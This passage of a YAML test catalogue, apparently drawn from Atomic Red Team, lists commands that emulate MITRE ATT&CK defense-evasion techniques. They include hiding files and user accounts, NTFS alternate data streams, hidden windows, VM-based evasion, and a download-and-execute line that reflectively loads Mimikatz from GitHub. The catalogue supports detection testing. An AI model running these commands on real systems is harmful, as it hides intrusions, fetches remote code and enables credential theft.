  description: Adversaries may set files and directories to be hidden to evade detection mechanisms. To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a hidden file. These files dont show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (<c...
  tactic: defense-evasion
  platforms:
    - linux
    - windows
    - macos
  executors:
    - name: Create a hidden file in a hidden directory
      type: sh
      platform: linux
      command: |-
        mkdir /var/tmp/.hidden-directory
        echo "T1564.001" > /var/tmp/.hidden-directory/.hidden-file
      cleanup: rm -rf /var/tmp/.hidden-directory/
      timeout: 60
    - name: Create a hidden file in a hidden directory
      type: sh
      platform: macos
      command: |-
        mkdir /var/tmp/.hidden-directory
        echo "T1564.001" > /var/tmp/.hidden-directory/.hidden-file
      cleanup: rm -rf /var/tmp/.hidden-directory/
      timeout: 60
    - name: Mac Hidden file
      type: sh
      platform: macos
      command: xattr -lr * / 2>&1 /dev/null | grep -C 2 "00 00 00 00 00 00 00 00 40 00 FF FF FF FF 00 00"
      timeout: 60
    - name: Create Windows System File with Attrib
      type: cmd
      platform: windows
      command: attrib.exe +s %temp%\T1564.001.txt
      cleanup: del /A:S %temp%\T1564.001.txt >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: Create Windows Hidden File with Attrib
      type: cmd
      platform: windows
      command: attrib.exe +h %temp%\T1564.001.txt
      cleanup: del /A:H %temp%\T1564.001.txt >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: Hidden files
      type: sh
      platform: macos
      command: setfile -a V /tmp/evil
      timeout: 60
    - name: Hide a Directory
      type: sh
      platform: macos
      command: |-
        touch /var/tmp/T1564.001_mac.txt
        chflags hidden /var/tmp/T1564.001_mac.txt
      cleanup: rm /var/tmp/T1564.001_mac.txt
      timeout: 60
    - name: Show all hidden files
      type: sh
      platform: macos
      command: defaults write com.apple.finder AppleShowAllFiles YES
      cleanup: defaults write com.apple.finder AppleShowAllFiles NO
      timeout: 60
    - name: Hide Files Through Registry
      type: cmd
      platform: windows
      command: |-
        reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v ShowSuperHidden /t REG_DWORD /d 0 /f
        reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v Hidden /t REG_DWORD /d 0 /f
      cleanup: |-
        reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v ShowSuperHidden /f >nul 2>&1
        reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Hidden /f >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: Create Windows Hidden File with powershell
      type: powershell
      platform: windows
      command: |-
        $file = Get-Item $env:temp\T1564.001-9.txt -Force
        $file.attributes='Hidden'
      cleanup: cmd /c 'del /A:H %temp%\T1564.001-9.txt >nul 2>&1'
      timeout: 120
      elevation_required: true
    - name: Create Windows System File with powershell
      type: powershell
      platform: windows
      command: |-
        $file = Get-Item $env:temp\T1564.001-10.txt -Force
        $file.attributes='System'
      cleanup: cmd /c 'del /A:H %temp%\T1564.001-10.txt >nul 2>&1'
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1564/001
  is_safe: false
- id: T1564.002
  name: Hidden Users
  description: "Adversaries may use hidden users to hide the presence of user accounts they create or modify. Administrators may want to hide users when there are many user accounts on a given system or if they want to hide their administrative or other management accounts from other users. \n\nIn macOS, adversaries can create or modify a user to be hidden through manipulating plist files, folder attributes, and user attributes. To prevent a user from being shown on the login screen and in System Preferences, adv..."
  tactic: defense-evasion
  platforms:
    - macos
    - windows
    - linux
  executors:
    - name: Create Hidden User using UniqueID < 500
      type: sh
      platform: macos
      command: sudo dscl . -create /Users/APT UniqueID 333
      cleanup: sudo dscl . -delete /Users/APT
      timeout: 60
      elevation_required: true
    - name: Create Hidden User using IsHidden option
      type: sh
      platform: macos
      command: sudo dscl . -create /Users/APT IsHidden 1
      cleanup: sudo dscl . -delete /Users/APT
      timeout: 60
      elevation_required: true
    - name: Create Hidden User in Registry
      type: cmd
      platform: windows
      command: "NET USER AtomicOperator$ At0micRedTeam! /ADD /expires:never \nREG ADD \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist\" /v AtomicOperator$ /t REG_DWORD /d 0"
      cleanup: |-
        reg delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v AtomicOperator$ /f >nul 2>&1
        net user ${user_name}$ /delete >nul 2>&1
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1564/002
  is_safe: false
- id: T1564.003
  name: Hidden Window
  description: "Adversaries may use hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks. \n\nAdversaries may abuse these functionalities to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.(Ci..."
  tactic: defense-evasion
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Hidden Window
      type: powershell
      platform: windows
      command: Start-Process powershell.exe -WindowStyle hidden calc.exe
      timeout: 120
    - name: Headless Browser Accessing Mockbin
      type: cmd
      platform: windows
      command: start "" chrome --headless --disable-gpu https://mockbin.org/bin/f6b9a876-a826-4ac0-83b8-639d6ad516ec
      cleanup: taskkill /im chrome /f
      timeout: 120
    - name: Hidden Window-Conhost Execution
      type: powershell
      platform: windows
      command: conhost.exe --headless calc.exe
      cleanup: Stop-Process -Name calc*
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1564/003
  is_safe: false
- id: T1564.004
  name: NTFS File Attributes
  description: 'Adversaries may use NTFS file attributes to hide their malicious data in order to evade detection. Every New Technology File System (NTFS) formatted partition contains a Master File Table (MFT) that maintains a record for every file/directory on the partition. (Citation: SpectorOps Host-Based Jul 2017) Within MFT entries are file attributes, (Citation: Microsoft NTFS File Attributes Aug 2010) such as Extended Attributes (EA) and Data [known as Alternate Data Streams (ADSs) when more than one Dat...'
  tactic: defense-evasion
  platforms:
    - windows
  executors:
    - name: Alternate Data Streams (ADS)
      type: cmd
      platform: windows
      command: |-
        type C:\temp\evil.exe > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"
        extrac32 c:\ADS\\procexp.cab c:\ADS\\file.txt:procexp.exe
        findstr /V /L W3AllLov3DonaldTrump c:\ADS\\procexp.exe > c:\ADS\\file.txt:procexp.exe
        certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\temp:ttt
        makecab c:\ADS\\autoruns.exe c:\ADS\\cabtest.txt:autoruns.cab
        print /D:c:\ADS\\file.txt:autoruns.exe c:\ADS\\Autoruns.exe
        reg export HKLM\SOFTWARE\Microsoft\Evilreg c:\ADS\\file.txt:evilreg.reg
        regedit /E c:\ADS\\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey
        expand \\webdav\folder\file.bat c:\ADS\\file.txt:file.bat
        esentutl.exe /y c:\ADS\\autoruns.exe /d c:\ADS\\file.txt:autoruns.exe /o
      timeout: 120
      elevation_required: true
    - name: Store file in Alternate Data Stream (ADS)
      type: powershell
      platform: windows
      command: |-
        if (!(Test-Path C:\Users\Public\Libraries\yanki -PathType Container)) {
            New-Item -ItemType Directory -Force -Path C:\Users\Public\Libraries\yanki
            }
        Start-Process -FilePath "$env:comspec" -ArgumentList "/c,type,c:\windows\system32\cmd.exe,>,`"C:\Users\Public\Libraries\yanki\desktop.ini:desktop.ini`""
      cleanup: Remove-Item "C:\Users\Public\Libraries\yanki\desktop.ini" -Force -ErrorAction Ignore
      timeout: 120
    - name: Create ADS command prompt
      type: cmd
      platform: windows
      command: |-
        echo cmd /c echo "Shell code execution."> %temp%\T1564.004_has_ads_cmd.txt:adstest.txt
        for /f "usebackq delims=?" %i in (%temp%\T1564.004_has_ads_cmd.txt:adstest.txt) do %i
      cleanup: del %temp%\T1564.004_has_ads_cmd.txt >nul 2>&1
      timeout: 120
    - name: Create ADS PowerShell
      type: powershell
      platform: windows
      command: |-
        echo "test" > $env:TEMP\T1564.004_has_ads_powershell.txt | set-content -path test.txt -stream adstest.txt -value "test"
        set-content -path $env:TEMP\T1564.004_has_ads_powershell.txt -stream adstest.txt -value "test2"
        set-content -path . -stream adstest.txt -value "test3"
      cleanup: Remove-Item -Path $env:TEMP\T1564.004_has_ads_powershell.txt -ErrorAction Ignore
      timeout: 120
    - name: Create Hidden Directory via $index_allocation
      type: cmd
      platform: windows
      command: |-
        md %temp%\...$.......::$index_allocation
        echo too many secrets > %temp%\...$.......::$index_allocation\secrets.txt
      cleanup: rmdir /S /Q %temp%\...$.......::$index_allocation >nul 2>&1
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1564/004
  is_safe: false
- id: T1564.006
  name: Run Virtual Instance
  description: 'Adversaries may carry out malicious operations using a virtual instance to avoid detection. A wide variety of virtualization technologies exist that allow for the emulation of a computer or computing environment. By running malicious code inside of a virtual instance, adversaries can hide artifacts associated with their behavior from security tools that are unable to monitor activity inside the virtual instance.(Citation: CyberCX Akira Ransomware) Additionally, depending on the virtual networkin...'
  tactic: defense-evasion
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Register Portable Virtualbox
      type: cmd
      platform: windows
      command: |-
        "C:\Program Files\Oracle\VirtualBox\VBoxSVC.exe" /reregserver
        regsvr32 /S "C:\Program Files\Oracle\VirtualBox\VboxC.dll"
        rundll32 "C:\Program Files\Oracle\VirtualBox\VBoxRT.dll,RTR3Init"
        sc create VBoxDRV binpath= "C:\Program Files\Oracle\VirtualBox\drivers\VboxDrv.sys" type= kernel start= auto error= normal displayname= PortableVBoxDRV
        sc start VBoxDRV
      cleanup: |-
        sc stop VBoxDRV
        sc delete VBoxDRV
        regsvr32 /u /S "C:\Program Files\Oracle\VirtualBox\VboxC.dll"
        msiexec /x "PathToAtomicsFolder\T1564.006\bin\Virtualbox_52.msi" /qn
      timeout: 120
    - name: Create and start VirtualBox virtual machine
      type: cmd
      platform: windows
      command: |-
        "C:\Program Files\Oracle\VirtualBox\VBoxManage.exe" createvm --name "Atomic VM" --register
        "C:\Program Files\Oracle\VirtualBox\VBoxManage.exe" modifyvm "Atomic VM" --firmware efi
        "C:\Program Files\Oracle\VirtualBox\VBoxManage.exe" startvm "Atomic VM"
      cleanup: |-
        "C:\Program Files\Oracle\VirtualBox\VBoxManage.exe" controlvm "Atomic VM" poweroff
        "C:\Program Files\Oracle\VirtualBox\VBoxManage.exe" unregistervm "Atomic VM" --delete
      timeout: 120
    - name: Create and start Hyper-V virtual machine
      type: powershell
      platform: windows
      command: |-
        $VM = "Atomic VM"
        New-VM -Name $VM -Generation 2
        Set-VMFirmware $VM -EnableSecureBoot Off
        Start-VM $VM
      cleanup: |-
        Stop-VM $VM -Force
        Remove-VM $VM -Force
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1564/006
  is_safe: false
- id: T1620
  name: Reflective Code Loading
  description: |-
    Adversaries may reflectively load code into a process in order to conceal the execution of malicious payloads. Reflective loading involves allocating then executing payloads directly within the memory of the process, vice creating a thread or process backed by a file path on disk (e.g., [Shared Modules](https://attack.mitre.org/techniques/T1129)).

    Reflectively loaded payloads may be compiled binaries, anonymous files (only present in RAM), or just snubs of fileless executable code (ex: position...
  tactic: defense-evasion
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: WinPwn - Reflectively load Mimik@tz into memory
      type: powershell
      platform: windows
      command: |-
        iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
        mimiload -consoleoutput -noninteractive
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1620
  is_safe: false
- id: T1622
  name: Debugger Evasion
  description: |-
    Adversaries may employ various means to detect and avoid debuggers. Debuggers are typically used by defenders to trace and/or analyze the execution of potential malware payloads.(Citation: ProcessHacker Github)

    Debugger evasion may include changing behaviors based on the results of the checks for the presence of artifacts indicative of a debugged environment. Similar to [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497), if the adversary detects a debugger, they may alt...
  tactic: defense-evasion
  tactics:
    - defense-evasion
    - discovery
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Detect a Debugger Presence in the Machine
      type: powershell
      platform: windows
      command: |-
        # Check for common debugger processes
        $debuggerProcesses = Get-Process | Where-Object { $_.ProcessName -match "dbg" -or $_.ProcessName -match "debug" }
        # Check for debugging flags
        $debuggingFlags = [System.Diagnostics.Debugger]::IsAttached
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1622
  is_safe: false
